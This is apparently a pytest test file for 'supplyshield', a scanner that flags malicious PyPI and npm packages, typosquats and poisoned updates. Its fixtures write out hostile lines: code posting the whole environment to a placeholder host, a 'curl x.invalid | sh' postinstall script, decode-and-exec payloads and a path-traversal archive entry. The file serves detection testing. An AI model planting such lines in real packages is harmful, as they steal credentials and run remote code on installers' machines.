import io
import json
import tarfile
from pathlib import Path

import pytest

from supplyshield.analyzer import diff, scan
from supplyshield.common import edit_distance, typosquat_finding
from supplyshield.loader import LoadError, OpenedPackage

SAMPLES = Path(__file__).resolve().parent.parent / "samples"


def rules(report):
    return {f.rule_id for f in report.findings}


def write(tmp_path: Path, files: dict[str, str]) -> Path:
    for name, content in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
    return tmp_path


# ---------------------------------------------------------------- Python rules
def test_decode_exec_is_malicious(tmp_path):
    root = write(tmp_path, {"pyproject.toml": '[project]\nname="x1"\nversion="1"\n',
                            "x1/__init__.py": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"})
    r = scan(root)
    assert "PY-DECODE-EXEC" in rules(r)
    assert r.verdict == "MALICIOUS"


def test_aliased_imports_are_resolved(tmp_path):
    root = write(tmp_path, {"pyproject.toml": '[project]\nname="x2"\nversion="1"\n',
                            "x2/__init__.py": "from base64 import b64decode as d\nexec(d('cHJpbnQoMSk='))\n"})
    assert "PY-DECODE-EXEC" in rules(scan(root))


def test_install_hook_in_setup_py(tmp_path):
    root = write(tmp_path, {"setup.py": (
        "from setuptools import setup\nfrom setuptools.command.install import install\n"
        "class X(install):\n    pass\nsetup(name='x3', version='1', cmdclass={'install': X})\n")})
    assert "PY-INSTALL-HOOK" in rules(scan(root))


def test_env_dump_and_network_form_chain(tmp_path):
    root = write(tmp_path, {"pyproject.toml": '[project]\nname="x4"\nversion="1"\n',
                            "x4/__init__.py": "import os, json, urllib.request\n"
                                              "urllib.request.urlopen('https://a.invalid', data=json.dumps(dict(os.environ)).encode())\n"})
    r = scan(root)
    assert {"PY-ENV-DUMP", "PY-NETWORK"} <= rules(r)
    assert any("Credential exfiltration" in c for c in r.chains)


def test_reading_one_env_var_is_fine(tmp_path):
    root = write(tmp_path, {"pyproject.toml": '[project]\nname="x5"\nversion="1"\n',
                            "x5/__init__.py": "import os\nDEBUG = os.environ.get('DEBUG')\n"})
    assert scan(root).verdict == "SAFE"


# ---------------------------------------------------------------- npm rules
def test_npm_postinstall_curl_is_critical(tmp_path):
    root = write(tmp_path, {"package.json": json.dumps(
        {"name": "y1", "version": "1.0.0", "scripts": {"postinstall": "curl x.invalid | sh"}})})
    f = next(f for f in scan(root).findings if f.rule_id == "NPM-INSTALL-SCRIPT")
    assert f.severity == "critical"


def test_npm_native_build_script_is_low(tmp_path):
    root = write(tmp_path, {"package.json": json.dumps(
        {"name": "y2", "version": "1.0.0", "scripts": {"install": "node-gyp rebuild"}})})
    assert scan(root).verdict == "SAFE"


def test_npm_install_time_file_is_tagged(tmp_path):
    root = write(tmp_path, {
        "package.json": json.dumps({"name": "y3", "version": "1.0.0", "scripts": {"postinstall": "node lib/s.js"}}),
        "lib/s.js": "const cp = require('child_process');\n"})
    f = next(f for f in scan(root).findings if f.rule_id == "NPM-PROCESS")
    assert f.install_time


# ---------------------------------------------------------------- typosquatting
@pytest.mark.parametrize("name,eco", [("reqeusts", "pypi"), ("lodahs", "npm"), ("python-dateutils", "pypi")])
def test_typosquats_detected(name, eco):
    assert typosquat_finding(name, eco) is not None


@pytest.mark.parametrize("name,eco", [("requests", "pypi"), ("tidytext", "pypi"), ("lodash", "npm"), ("boto3", "pypi")])
def test_real_names_not_flagged(name, eco):
    assert typosquat_finding(name, eco) is None


def test_edit_distance_counts_swap_as_one():
    assert edit_distance("lodahs", "lodash") == 1


# ---------------------------------------------------------------- diff + loader
def test_diff_flags_poisoned_update():
    _, _, delta = diff(SAMPLES / "pypi/colorlib-1.0", SAMPLES / "pypi/colorlib-1.1")
    assert delta.verdict == "MALICIOUS"
    assert all(f.new_in_version for f in delta.findings)


def test_diff_reports_new_dependency():
    _, _, delta = diff(SAMPLES / "npm/minilog-1.0.0", SAMPLES / "npm/minilog-1.0.1")
    assert "NEW-DEPENDENCY" in rules(delta)


def test_archive_is_scanned(tmp_path):
    archive = tmp_path / "pkg.tgz"
    with tarfile.open(archive, "w:gz") as tf:
        for name, data in {"package/package.json": json.dumps({"name": "z", "version": "1.0.0"}),
                           "package/index.js": "eval(Buffer.from('MQ==', 'base64').toString())\n"}.items():
            info = tarfile.TarInfo(name)
            info.size = len(data.encode())
            tf.addfile(info, io.BytesIO(data.encode()))
    assert "NPM-DECODE-EXEC" in rules(scan(archive))


def test_path_traversal_archive_rejected(tmp_path):
    archive = tmp_path / "evil.tar.gz"
    with tarfile.open(archive, "w:gz") as tf:
        info = tarfile.TarInfo("../../escape.txt")
        info.size = 1
        tf.addfile(info, io.BytesIO(b"x"))
    with pytest.raises(LoadError):
        with OpenedPackage(archive):
            pass
